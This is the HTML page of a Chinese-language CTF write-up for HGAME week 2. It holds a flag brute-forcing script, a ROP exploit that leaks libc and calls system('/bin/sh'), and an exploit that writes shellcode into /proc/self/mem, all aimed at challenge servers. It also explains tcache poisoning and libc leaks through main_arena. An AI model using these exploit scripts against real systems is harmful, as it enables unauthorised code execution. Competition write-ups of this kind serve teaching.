@@ -1,0 +1,527 @@
+<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>HGAME-WEEK2-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="RE fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = 'debug') total_char = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.>,<:;\&#34;\'\\`~!@#$%^&*(){}[]' def test(flag_now): sh = remote(&#34;101.132.177.131&#34;,9999) payload = flag_now sh.sendlineafter(&#34;now!\n&#34;,payload) for i in range(2 * len(flag_now)): sh.sendlineafter(&#34;---\n&#34;,' ')"><meta property="og:image" content><meta property="og:title" content="HGAME-WEEK2-WP"><meta property="og:description" content="RE fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = 'debug') total_char = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.>,<:;\&#34;\'\\`~!@#$%^&*(){}[]' def test(flag_now): sh = remote(&#34;101.132.177.131&#34;,9999) payload = flag_now sh.sendlineafter(&#34;now!\n&#34;,payload) for i in range(2 * len(flag_now)): sh.sendlineafter(&#34;---\n&#34;,' ')"><meta property="og:type" content="article"><meta property="og:url" content="https://chujdk.github.io/wp/1078.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-02-14T20:00:00+00:00"><meta property="article:modified_time" content="2021-02-14T20:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="HGAME-WEEK2-WP"><meta name=twitter:description content="RE fake_debugger beta 没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了 #!/usr/bin/env python # coding=utf-8 from pwn import * #context(log_level = 'debug') total_char = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.>,<:;\&#34;\'\\`~!@#$%^&*(){}[]' def test(flag_now): sh = remote(&#34;101.132.177.131&#34;,9999) payload = flag_now sh.sendlineafter(&#34;now!\n&#34;,payload) for i in range(2 * len(flag_now)): sh.sendlineafter(&#34;---\n&#34;,' ')"><script src=https://chujdk.github.io/js/feather.min.js></script>
+<link href=https://chujdk.github.io/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://chujdk.github.io/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://chujdk.github.io/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://chujdk.github.io/>blog of chuj</a></div><nav><a href=/>Home</a>
+<a href=/posts.html>All posts</a>
+<a href=/about.html>About</a>
+<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>HGAME-WEEK2-WP</h1><div class=meta>Posted on Feb 14, 2021</div></div><section class=body><h2 id=re>RE</h2><h3 id=fake_debugger-beta>fake_debugger beta</h3><p>没搞懂，不同位置的不同字符对应的编码都不同，没什么思路，写了个脚本爆破了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#context(log_level = &#39;debug&#39;)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>total_char <span style=color:#666>=</span> <span style=color:#4070a0>&#39;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+|/?.&gt;,&lt;:;</span><span style=color:#4070a0;font-weight:700>\&#34;\&#39;\\</span><span style=color:#4070a0>`~!@#$%^&amp;*()</span><span style=color:#70a0d0>{}</span><span style=color:#4070a0>[]&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>test</span>(flag_now):
+</span></span><span style=display:flex><span>    sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;101.132.177.131&#34;</span>,<span style=color:#40a070>9999</span>)
+</span></span><span style=display:flex><span>    payload <span style=color:#666>=</span> flag_now
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;now!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>2</span> <span style=color:#666>*</span> <span style=color:#007020>len</span>(flag_now)):
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;---</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39; &#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;eax: &#39;</span>)
+</span></span><span style=display:flex><span>    code <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>))
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>close()
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> code
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>get_next</span>(flag_now):
+</span></span><span style=display:flex><span>    sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;101.132.177.131&#34;</span>,<span style=color:#40a070>9999</span>)
+</span></span><span style=display:flex><span>    payload <span style=color:#666>=</span> flag_now <span style=color:#666>+</span> <span style=color:#4070a0>&#39;a&#39;</span>
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;now!</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,payload)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>2</span> <span style=color:#666>*</span> <span style=color:#007020>len</span>(flag_now) <span style=color:#666>+</span> <span style=color:#40a070>2</span>):
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;---</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,<span style=color:#4070a0>&#39; &#39;</span>)
+</span></span><span style=display:flex><span>    sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#39;ebx: &#39;</span>)
+</span></span><span style=display:flex><span>    code <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>))
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> code
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#666>=</span> <span style=color:#4070a0>&#39;hgame{You_Kn0w_debuG&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span>(flag[<span style=color:#666>-</span><span style=color:#40a070>1</span>] <span style=color:#666>!=</span> <span style=color:#4070a0>&#39;}&#39;</span>):
+</span></span><span style=display:flex><span>    mapping <span style=color:#666>=</span> {}
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> charac <span style=color:#007020;font-weight:700>in</span> total_char:
+</span></span><span style=display:flex><span>        mapping[test(flag <span style=color:#666>+</span> charac)] <span style=color:#666>=</span> charac
+</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#print(str(test(charac)) + &#39;:&#39; + charac + &#39;=&gt;&#39; + mapping[test(charac)])</span>
+</span></span><span style=display:flex><span>    flag <span style=color:#666>+=</span> mapping[get_next(flag)]
+</span></span><span style=display:flex><span>    <span style=color:#007020>print</span> flag
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020>print</span> flag
+</span></span></code></pre></div><p>分了几次爆破，所以这个脚本的起点就几乎是 <code>flag</code> 了</p><h2 id=pwn>pwn</h2><h3 id=rop_primary>rop_primary</h3><p>没什么难度，就是单纯的 ROP</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>LibcSearcher</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>import</span> <span style=color:#0e84b5;font-weight:700>re</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./rop_primary&#34;</span>)
+</span></span><span style=display:flex><span>pop_rdi_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401613</span>
+</span></span><span style=display:flex><span>pop_rsi_r15_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401611</span>
+</span></span><span style=display:flex><span>pop_r14_r15_ret <span style=color:#666>=</span> <span style=color:#40a070>0x401610</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>def</span> <span style=color:#06287e>matrixMul</span>(A, B):
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> <span style=color:#007020>len</span>(A[<span style=color:#40a070>0</span>]) <span style=color:#666>==</span> <span style=color:#007020>len</span>(B):
+</span></span><span style=display:flex><span>        res <span style=color:#666>=</span> [[<span style=color:#40a070>0</span>] <span style=color:#666>*</span> <span style=color:#007020>len</span>(B[<span style=color:#40a070>0</span>]) <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(A))]
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(A)):
+</span></span><span style=display:flex><span>            <span style=color:#007020;font-weight:700>for</span> j <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(B[<span style=color:#40a070>0</span>])):
+</span></span><span style=display:flex><span>                <span style=color:#007020;font-weight:700>for</span> k <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#007020>len</span>(B)):
+</span></span><span style=display:flex><span>                    res[i][j] <span style=color:#666>+=</span> <span style=color:#007020>int</span>(A[i][k]) <span style=color:#666>*</span> <span style=color:#007020>int</span>(B[k][j])
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>return</span> res
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30372</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;A:</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
+</span></span><span style=display:flex><span>matA <span style=color:#666>=</span> []
+</span></span><span style=display:flex><span>matB <span style=color:#666>=</span> []
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
+</span></span><span style=display:flex><span>    number_string <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(number_string <span style=color:#666>==</span> <span style=color:#4070a0>&#39;B:&#39;</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
+</span></span><span style=display:flex><span>    matA<span style=color:#666>.</span>append(re<span style=color:#666>.</span>findall(<span style=color:#4070a0>r</span><span style=color:#4070a0>&#34;\d+\.?\d*&#34;</span>,number_string))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#40a070>1</span>:
+</span></span><span style=display:flex><span>    number_string <span style=color:#666>=</span> sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>)
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span>(number_string <span style=color:#666>==</span> <span style=color:#4070a0>&#39;a * b = ?&#39;</span>):
+</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>break</span>
+</span></span><span style=display:flex><span>    matB<span style=color:#666>.</span>append(re<span style=color:#666>.</span>findall(<span style=color:#4070a0>r</span><span style=color:#4070a0>&#34;\d+\.?\d*&#34;</span>,number_string))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>matAns <span style=color:#666>=</span> matrixMul(matA,matB)
+</span></span><span style=display:flex><span><span style=color:#007020>print</span> matAns
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> matAns:
+</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>for</span> j <span style=color:#007020;font-weight:700>in</span> i:
+</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#007020>str</span>(j))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;best</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>got[<span style=color:#4070a0>&#39;puts&#39;</span>]) <span style=color:#666>+</span> p64(elf<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;puts&#34;</span>]) <span style=color:#666>+</span> p64(<span style=color:#40a070>0x40157B</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendline(payload)
+</span></span><span style=display:flex><span>leak_addr <span style=color:#666>=</span> u64(sh<span style=color:#666>.</span>recv(<span style=color:#40a070>6</span>)<span style=color:#666>.</span>ljust(<span style=color:#40a070>8</span>,<span style=color:#4070a0>&#39;</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#39;</span>))
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;addr:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(leak_addr))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> LibcSearcher(<span style=color:#4070a0>&#39;puts&#39;</span>,leak_addr)
+</span></span><span style=display:flex><span>libc_base <span style=color:#666>=</span> leak_addr <span style=color:#666>-</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;puts&#34;</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;libc_base:&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base))
+</span></span><span style=display:flex><span>system_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#34;system&#34;</span>)
+</span></span><span style=display:flex><span>bin_sh_addr <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>dump(<span style=color:#4070a0>&#39;str_bin_sh&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;a&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>0x30</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#39;b&#39;</span> <span style=color:#666>*</span> <span style=color:#40a070>8</span> <span style=color:#666>+</span> p64(pop_r14_r15_ret) <span style=color:#666>+</span> p64(<span style=color:#40a070>0</span>) <span style=color:#666>*</span> <span style=color:#40a070>2</span> 
+</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(pop_rdi_ret) <span style=color:#666>+</span> p64(bin_sh_addr) <span style=color:#666>+</span> p64(system_addr)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#39;best</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#39;</span>,payload)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><p>写完exp打远程的时候发现搜不出来 libc，考虑是 libc-database 版本过低，然后尝试更新，但是 libc-database 本身是装 LibcSearcher 的时候一起装的，可能安装的时候有点问题，get 脚本用不来，所以只好整个 libc-database 删掉重装，重新 get，家里的带宽确实比较小，整个更新大概花了半个多小时，再加上更新的时候干别的事情去了差点把这题忘了，所以很晚才打通，但是运气还算不错，抢到了一血，只比二血早了30秒</p><h3 id=the_shop_of_cosmos>the_shop_of_cosmos</h3><p>这道题是真的开阔视野了，出的是真当炫酷。程序的逻辑很简单，有无限次读文件和无限次写文件的机会。其实看到题目我第一个就想到了对 <code>/proc</code> 目录动手，但是当时觉得不知道服务器跑的进程的 <code>uid</code> 也没有用。虽然终端里面有 <code>$UID</code> 可以代替，但是 <code>open</code> 里没法用，遂放弃，想想真的很遗憾，放出 <code>hint</code>之后我仔细看了一下这个目录的相关知识，了解到有<code>self</code> 这个目录，每个进程访问都可以访问到自己的对应 <code>uid</code> 的目录，同时也避免了 <code>frok</code> 之类操作对 <code>uid</code> 的改变这样的问题。而每个进程对应 <code>uid</code> 目录中都有一些该进程信息的虚拟文件，我们主要关系 <code>maps</code> 和 <code>mem</code>,前者存储了进程的内存映射情况，可以获得各种基地址；后者则是进程占有的整个内存空间的映射，这个文件是可读写的，<code>.text</code> 也同样可写。所以思路就有了，先通过一次读获取进程的基地址，然后通过一次写把一段会执行的 <code>.text</code> 中的代码直接写成 shellcode 就可以 getshell 了。</p><p>利用整型溢出可以获得无限的钱，这个应该不用多说了</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
+</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
+</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
+</span></span><span style=display:flex><span>context(arch <span style=color:#666>=</span> <span style=color:#4070a0>&#39;amd64&#39;</span>,os <span style=color:#666>=</span> <span style=color:#4070a0>&#39;linux&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./shop&#34;</span>)
+</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libc.so.6&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> process(<span style=color:#4070a0>&#34;./shop&#34;</span>)
+</span></span><span style=display:flex><span>sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;159.75.104.107&#34;</span>,<span style=color:#40a070>30398</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#34;1&#34;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#34;4294867296&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;2&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;/proc/self/maps&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;：&#34;</span>)
+</span></span><span style=display:flex><span>prog_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>)
+</span></span><span style=display:flex><span>log<span style=color:#666>.</span>success(<span style=color:#4070a0>&#34;prog_base:&#34;</span>,prog_base)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;3&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;1&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#4070a0>&#39;/proc/self/mem&#39;</span>)
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(prog_base <span style=color:#666>+</span> <span style=color:#40a070>0x17EC</span>))
+</span></span><span style=display:flex><span>shellcode <span style=color:#666>=</span> asm(shellcraft<span style=color:#666>.</span>sh())
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,<span style=color:#007020>str</span>(<span style=color:#007020>len</span>(shellcode)))
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>sendlineafter(<span style=color:#4070a0>&#34;&gt;&gt; &#34;</span>,shellcode)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>sh<span style=color:#666>.</span>interactive()
+</span></span></code></pre></div><h3 id=patriots-note>patriot’s note</h3><p>这算是一个 <code>Tcache poisoning</code> 的裸题了吧，以前做题的时候一直没去研究 <code>Tcache</code> 相关的机制，这一次看了一下发现确实使利用变的简单了许多。<code>Tcache</code> 的优先级很高，高于 <code>Fastbin</code> 和 <code>top chunk</code> 的前向合并。 <code>Tcache</code> 和 <code>Fastbin</code> 其实挺像的，当然 <code>Tcache</code> 本身是一个单独维护的隔离链表，而 <code>Fastbin</code> 只是一个 LIFO 的单链表（换句话说就是用链表模拟的栈），这里来看的话区别还是很大的，但是在利用上有相似之处。就本题来看，存在 <code>UAF</code> ，可以对 <code>Tcache</code> 结构体的 <code>next</code> 指针任意写，这样就可以实现任意地址分配，从而实现任意地址写。和 <code>Fastbin</code> 的 <code>Arbitrary Alloc</code> 没什么区别，唯一的就是 <code>Tcache</code> 不会对被分配地址 <code>chunk</code> 的 <code>size</code> 标记做检测，所以我们甚至不需要伪造 <code>size</code> 就可以直接 <code>Arbitrary Alloc</code> 了。当然实现利用还需要一个 leak，可以申请并释放一个属于 <code>Unsorted Bin</code> 的 <code>chunk</code>（就本题而言，还需要避免这个 <code>chunk</code> 被 <code>top chunk</code> 合并掉），这样在 <code>bin</code>中的<code>chunk</code>的<code>fd</code>指针就会指向<code>main_arena</code>的一个固定偏移处，然后通过<code>puts</code> 功能就可以 leak 出 libc 的基地址了。</p><h4 id=关于-main_arena>关于 <code>main_arena</code></h4><h5 id=fd-指向-main_arena-的固定偏移处的原因><code>fd</code> 指向 <code>main_arena</code> 的固定偏移处的原因</h5><p>随随便便地说 <code>fd</code> 必定会指向 <code>main_arena</code> 的一个固定偏移显得很苍白，原因还是解释一下，<code>main_arena</code> 是 <code>ptmalloc</code> 管理主分配区的唯一实例，其类型为 <code>struct malloc_state</code>，就 2.27 版本的 libc 来说是这样定义的</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Serialize access.  */</span>
+</span></span><span style=display:flex><span>  __libc_lock_define (, mutex);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Flags (formerly in max_fast).  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> flags;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Set if the fastbin chunks contain recently inserted free blocks.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Note this is a bool but not all targets support atomics on booleans.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> have_fastchunks;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Fastbins */</span>
+</span></span><span style=display:flex><span>  mfastbinptr fastbinsY[NFASTBINS];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Base of the topmost chunk -- not otherwise kept in a bin */</span>
+</span></span><span style=display:flex><span>  mchunkptr top;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* The remainder from the most recent split of a small request */</span>
+</span></span><span style=display:flex><span>  mchunkptr last_remainder;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Normal bins packed as described above */</span>
+</span></span><span style=display:flex><span>  mchunkptr bins[NBINS <span style=color:#666>*</span> <span style=color:#40a070>2</span> <span style=color:#666>-</span> <span style=color:#40a070>2</span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Bitmap of bins */</span>
+</span></span><span style=display:flex><span>  <span style=color:#902000>unsigned</span> <span style=color:#902000>int</span> binmap[BINMAPSIZE];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Linked list */</span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span> <span style=color:#666>*</span>next;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/* Linked list for free arenas.  Access to this field is serialized
+</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>     by free_list_lock in arena.c.  */</span>
+</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> <span style=color:#0e84b5;font-weight:700>malloc_state</span> <span style=color:#666>*</span>next_free;
+</span></span><span style=display:flex><span>
